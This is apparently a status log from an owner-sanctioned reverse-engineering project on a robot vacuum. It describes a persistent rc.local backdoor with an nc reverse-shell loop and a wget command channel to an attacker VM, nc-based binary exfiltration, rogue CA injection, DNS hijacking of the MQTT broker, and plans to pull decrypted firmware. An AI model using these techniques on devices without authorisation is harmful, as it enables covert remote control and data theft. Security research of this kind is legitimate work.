# Status — what works and what's blocked (updated 2026-11-18)

## Works, live-verified on the real robot

- **ROOT SHELL (persistent)** — one line in `/etc/rc.local` (owner-sanctioned):
  a backgrounded self-healing reconnect loop over busybox `nc` to the VM
  (:4545), plus an HTTP-poll command channel (`wget http://10.2.100.2:8081/cmd`
  every 15 s, output back over :4550). Robot reboots bring both back.
  Original rc.local kept at `robot_dump/etc_rc.local.orig`.
- **Filesystem read/write over MQTT** — reliable (the old "degradation" was
  client bugs, fixed). Ceiling ≥1.2 MB per read; with the shell there is no
  limit (34 MB `application_node` pulled via nc).
- **Binary exfil channel** — one-shot nc listeners on the VM
  (`/opt/exfil_once.sh PORT NAME`); pulled: wireless_communicator_node (3.9 MB),
  upgrader_node (2.8 MB), application_node (34 MB!), libnrml_security.so,
  librobokit_platform_domain.so, narwal_rootca.crt, pub_key.pem.
- **IPv6 disabled robot-side** — verified off across reboots and hijacks.
- **CA installed** in the system bundle (174th cert) — only affects clients
  that use the bundle.

## The architecture (from the pulled binaries + live shell)

- ROS Kinetic; nodes incl. **application_node = the MQTT owner**
  (`mqtt::ssl_options` + paho MQTTAsync inside it — the cloud :8883
  connection belongs to PID of application_node), wireless_communicator,
  **upgrader_node** (OTA), plus media/sys_monitor/ecological_agent/
  robokit_telemetry/product_advance.
- **THE MQTT TRUST ANSWER** (statically recovered from application_node at
  0x19aee60): `ssl_options.set_enable_server_cert_auth(true)` +
  `ca_path("/etc/ssl/certs")` — **the certificate DIRECTORY**, hash-lookup
  mode. That is why appending to `ca-certificates.crt` (file) and
  `narwal_rootca.crt` never flipped MQTT: the client only consults
  `<subject-hash>.0` entries in the dir.
  **Fix (ready):** drop our CA in as `/etc/ssl/certs/33148072.0` via the
  root shell (file staged on the VM), then point DNS at the offline broker.
- **Bootstrap HTTPS (iot-auth-global)** still rejects our CA (unknown_ca,
  strict, persistent) — different client (curl/Poco-family); unresolved,
  but NOT needed for MQTT control.
- **Firmware crypto**: `libnrml_security.so` = aes-256-cbc streaming decrypt
  (`nrml_security_package_decrypt(src,dst,keyfile)`) with the key in
  **OP-TEE** (`libteec`, /dev/tee0, RPMB). Standalone calls via ctypes
  harness reach the TEE and get refused (custom codes 0x4015091/0x4011041).
  BUT: the upgrader's live log says
  **`/oem/DISK/bin/pita/firmware_back/` is "already parsed"** — the robot
  keeps a decrypted firmware staging/backup dir on /oem. Exfil of that dir
  (after the current cleaning run) likely yields the whole plaintext
  firmware image without any crypto fight.
- `usr_bin_swupdate` = crypto-stripped installer (cpio/zlib + Allwinner
  boot burn via /lib/libota-burnboot.so; NO OpenSSL at all — its
  aes-key-file loader is dead code). The real verify+decrypt is upgrader+
  libnrml_security.
- OTA oracle rebuilt into the emulator (`_ota_check` serves
  /var/tmp/narwal_cap/ota_override.json; `/fw/<name>` file serving).
  Live test 2026-11-18: robot checked, got the forced response, download
  attempt failed (errorCode 固件下载失败 — TLS strict path; E2/E3 proved
  the lenient path downloads from us). Override disabled while the robot
  cleans; re-enable after.

## Next steps (ranked)

1. **After the cleaning run (paused ~1h per owner)**:
   a. `cd /etc/ssl/certs && wget http://10.2.100.2:8081/ca-33148072.0`
      → hijack us-01.mqtt DNS → robot should CONNECT to our offline broker
      → full offline control via `emulator/control.py`.
   b. Exfil `/oem/DISK/bin/pita/firmware_back/` (decrypted firmware?).
   c. Re-enable the forced OTA override → let the real upgrader decrypt the
      genuine npkg → harvest staged plaintext from /userdata/usr/ota/.
2. Bootstrap HTTPS trust — find that client's CA config (Poco/curl).
3. Root-password crack — moot with the shell.

## Operational notes

- Never run two dynamic_params MQTT clients concurrently (response
  cross-matching; matching now correlation-strict).
- Robot-side persistence survives reboots; rollback = write
  `etc_rc.local.orig` back (MQTT) + remove the hashed CA + revert DNS.
- The VM now runs: emulator :443 (oracle-capable), offline mosquitto :8883
  TLS + :1884 plaintext, revshell listener :4545, cmd HTTP :8081 +
  collector :4550, dnsmasq (us-open-only override active during the
  cleaning pause; MQTT/bootstrap resolve real).
